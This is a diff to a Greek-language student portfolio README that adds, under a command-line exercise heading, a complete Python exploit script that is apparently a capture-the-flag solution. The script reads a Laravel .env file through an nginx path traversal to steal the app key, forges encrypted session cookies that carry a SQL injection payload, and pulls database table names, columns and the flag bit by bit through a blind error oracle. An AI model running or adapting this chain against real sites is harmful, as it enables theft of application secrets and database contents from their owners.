@@ -201,7 +201,179 @@ Pull requests στο [site της ομάδας](https://kafeneio-site-pibook.net
  
 | [Images pull](https://github.com/Kafeneio/images/pull/4) | [Gallery pull](https://github.com/Kafeneio/_gallery/pull/4) | [site pull](https://github.com/Kafeneio/site/pull/8) |
 | --- | --- | --- |
-  
+
+
+<br>
+
+## :pushpin:: Άσκηση γραμμής εντολών CLI 
+
+[![asciicast](https://asciinema.org/a/480839.svg)](https://asciinema.org/a/480839)
+
+```python
+import os
+import re
+import json
+import hmac
+import base64
+import hashlib
+import requests
+import phpserialize
+import urllib.parse
+from Crypto.Cipher import AES
+
+url = input("[!]Please insert injected URL: ")
+
+# Initialize Session
+session = requests.Session()
+session.get(url)
+
+
+def _unpad(s):
+    return s[:-ord(s[len(s)-1:])]
+
+def mcrypt_decrypt(value, iv):
+    global key
+    crypt_object = AES.new(key=key, mode=AES.MODE_CBC, IV=iv)
+    return crypt_object.decrypt(value)
+
+def mcrypt_encrypt(value, iv):
+    global key
+    crypt_object = AES.new(key=key, mode=AES.MODE_CBC, IV=iv)
+    return crypt_object.encrypt(value)
+
+def decrypt(bstring):
+    global key
+    dic = json.loads(base64.b64decode(bstring).decode())
+
+    mac = dic['mac']
+    value = base64.b64decode(dic['value'])
+    iv = base64.b64decode(dic['iv'])
+
+    decrypted = _unpad(mcrypt_decrypt(value,iv))
+    dec_json = json.loads(decrypted)
+    return dec_json
+
+def encrypt(string, exp_date=4625829726):
+    global key
+
+    iv = os.urandom(16)
+
+    string = json.dumps(
+        {
+            "data": phpserialize.dumps(string).decode('utf-8'),
+            "expires":exp_date
+        }
+    ).encode('utf-8')
+
+    ####### Add some padding ###########
+    padding = 16 - len(string) % 16
+    string += bytes(chr(padding) * padding, 'utf-8')
+
+    #### Values, iv, mac everything ######
+    value = base64.b64encode(mcrypt_encrypt(string, iv))
+    iv = base64.b64encode(iv)
+    mac = hmac.new(key, iv+value, hashlib.sha256).hexdigest()
+    dic = {'iv': iv.decode(), 'value': value.decode(), 'mac': mac}
+    return base64.b64encode(bytes(json.dumps(dic), 'utf-8'))
+
+def getCookie():
+    cookies_jar = session.cookies
+    for key in cookies_jar.keys():
+        if "nginxatsu" not in key:
+            cookie_name = key
+            cookie = urllib.parse.unquote(cookies_jar[key])
+            break
+    return cookie, cookie_name
+
+def getAppKey():
+    enviroment = f'{url}/assets../.env' 
+    resp = session.get(enviroment)
+    encodedKey = re.search('APP_KEY=base64:(.*)\n', resp.text).group(1)
+    key = base64.b64decode(encodedKey)
+    return key
+
+def php_serialized_to_dict(serialized):
+    dict_bytes = phpserialize.unserialize(bytes(serialized, 'utf-8'))
+    
+    print(dict_bytes)
+    dict_regular = {
+        key.decode(): val.decode() if isinstance(val, bytes) else val
+        for key, val in dict_bytes.items()
+    }
+    return dict_regular
+
+def craftPayload(encryptedCookie, payload):
+    decryptedCookie = decrypt(encryptedCookie)
+    
+    unserializedData = phpserialize.unserialize(decryptedCookie['data'].encode('utf-8'))
+
+    unserializedData['order'] = bytes(f"id->pepegkas\"')), {payload} # ", "utf-8")
+    return unserializedData
+
+def forgeCookie(data, cookie_name):
+    forged_cookie = encrypt(data)
+    session.cookies[cookie_name] = forged_cookie.decode()
+    config_api = f'{url}/api/configs'
+    resp = session.get(config_api)
+    return resp.status_code == 500
+
+def exfiltrate(func, sub=0, int_size=8):
+    for i in reversed(range(0, int_size)):
+        sub *= 2
+        sub += int(func(i, sub))
+    return chr(sub)
+
+def exfil_sleep(cookie, cookie_name, payload, **kwargs):
+    def inner(shift, sub):
+        data = craftPayload(cookie, payload.format(shift=shift, **kwargs))
+        return forgeCookie(data, cookie_name)
+    return exfiltrate(inner)
+
+def getTableName():
+    get_table_names_from = get_payload('SELECT ASCII(substr((SELECT group_concat(table_name) FROM mysql.innodb_table_stats WHERE database_name=\'{db_name}\'), {index}, 1)) >> {shift} & 1')
+    f, i = '', 0
+    while not f.endswith(','):
+        i += 1
+        f += exfil_sleep(cookie, cookie_name, get_table_names_from, db_name='nginxatsu', index=i)
+        print(f)
+    return f.replace(',', '')
+    
+def getColumnName(table_name):
+    get_column_names_from = get_payload('SELECT ASCII(substr((SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name=\'{tbl_name}\' AND column_name NOT LIKE \'id\'), {index}, 1)) >> {shift} & 1')
+    f, i = '', 0
+    while not f.endswith(','):
+        i += 1
+        f += exfil_sleep(cookie, cookie_name, get_column_names_from, db_name='nginxatsu', tbl_name=table_name, index=i)
+        print(f)
+    return f.replace(',', '')    
+
+def getColumnContents(table_name, column_name):
+    get_column_contents_from = get_payload('SELECT ASCII(substr((SELECT {column} FROM {db_name}.{tbl_name}), {index}, 1)) >> {shift} & 1')
+    flag, i = '', 0
+    while not flag.endswith('}'):
+        i += 1
+        flag += exfil_sleep(cookie, cookie_name, get_column_contents_from, db_name='nginxatsu', tbl_name=table_name, column=column_name, index=i)
+        print(flag)
+    return flag
+
+cookie,cookie_name = getCookie()
+key = getAppKey()
+
+get_payload = lambda p: "(SELECT 1 REGEXP (SELECT IF((%s), 0x5b, 0x5d)))" % p
+
+print('Getting Table Name:', end='\n==============================================\n')
+
+table_name = getTableName()
+print('\n-> Table Name: ' + table_name, end='\n')
+
+print('\nGetting Column Name:', end='\n==============================================\n')
+column_name = getColumnName(table_name)
+print('\n-> Column Name: ' + column_name, end='\n')
+
+print('\nGetting Column Contents:', end='\n==============================================\n')
+column_name = getColumnContents(table_name, column_name)
+print('\n-> Flag: ' + column_name)
+```
   
 ## Συμμετοχή και ομαδικότητα
 [Show & tell μια λύση που είχα για το πως μπορούμε να κάνουμε deploy το “σπασμένο” webring του maxboeck](https://github.com/courses-ionio/help/discussions/165#discussion-3897013) <br>
